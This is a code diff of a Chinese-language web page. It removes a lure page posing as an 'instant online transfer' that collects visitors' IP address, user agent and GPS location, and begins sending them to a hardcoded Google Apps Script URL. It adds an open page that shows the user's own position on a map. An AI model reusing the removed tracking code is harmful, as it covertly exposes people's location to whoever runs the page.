@@ -2,41 +2,70 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>線上立即轉帳</title>
+    <title>位置回報</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
-        button { padding: 15px 25px; font-size: 20px; cursor: pointer; }
-        #status { margin-top: 20px; font-size: 18px; color: #333; }
+        body { font-family: Arial, sans-serif; text-align: center; }
+        #map { height: 400px; width: 100%; margin-top: 15px; }
+        button { padding: 10px 20px; font-size: 18px; margin-top: 15px; }
+        #coords { margin-top: 10px; font-size: 16px; }
     </style>
 </head>
 <body>
-    <h2>線上立即轉帳</h2>
-    <p>按下按鈕將自動開啟轉帳功能</p>
-    <button id="actionBtn" onclick="sendLocation()">下一步</button>
-    <p id="status"></p>
+    <h2>回報您的位置</h2>
+    <p>請按下按鈕並允許定位，將會顯示您的位置</p>
+    <button onclick="getLocation()">取得位置</button>
+    <div id="coords"></div>
+    <button id="copyBtn" style="display:none;" onclick="copyCoords()">複製座標</button>
+    <div id="map"></div>
 
+    <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
     <script>
-        const GAS_URL = "https://script.google.com/macros/s/AKfycbyWCmFH3MfqiclvhddGbWTmltlAzQIV5xI4bgB2QxmXgtvxM9vjhU1b7oCje9aaNglGbQ/exec";
+        let map, marker;
 
-        async function sendLocation() {
-            const btn = document.getElementById("actionBtn");
-            btn.disabled = true;
-            document.getElementById("status").innerText = "正在驗證並處理，請稍候...";
+        function getLocation() {
+            if (navigator.geolocation) {
+                document.getElementById("coords").innerText = "正在取得位置...";
+                navigator.geolocation.getCurrentPosition(showPosition, showError);
+            } else {
+                document.getElementById("coords").innerText = "瀏覽器不支援定位功能";
+            }
+        }
 
-            try {
-                // 取得 IP
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                const userIP = ipData.ip;
+        function showPosition(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            document.getElementById("coords").innerHTML = `經度: ${lon}<br>緯度: ${lat}`;
+            document.getElementById("copyBtn").style.display = "inline-block";
 
-                const userAgent = navigator.userAgent;
+            if (!map) {
+                map = L.map('map').setView([lat, lon], 15);
+                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                    attribution: '&copy; OpenStreetMap'
+                }).addTo(map);
+                marker = L.marker([lat, lon]).addTo(map);
+            } else {
+                map.setView([lat, lon], 15);
+                marker.setLatLng([lat, lon]);
+            }
+        }
 
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(async function(position) {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        const mapLink = `https://maps.google.com/?q=${lat},${lon}`;
-                        const textMessage = `這是我的位置：\n${mapLink}`;
+        function showError(error) {
+            let msg = "";
+            switch(error.code) {
+                case error.PERMISSION_DENIED: msg = "使用者拒絕提供位置"; break;
+                case error.POSITION_UNAVAILABLE: msg = "無法取得位置資訊"; break;
+                case error.TIMEOUT: msg = "請求超時"; break;
+                default: msg = "未知錯誤"; break;
+            }
+            document.getElementById("coords").innerText = msg;
+        }
 
-                        // 傳送資料到 GAS
-                        const response = await fetch(GAS_URL, {
+        function copyCoords() {
+            const text = document.getElementById("coords").innerText.replace(/\n/g, ' ');
+            navigator.clipboard.writeText(text);
+            alert("座標已複製，可以貼給朋友或警方");
+        }
+    </script>
+</body>
+</html>
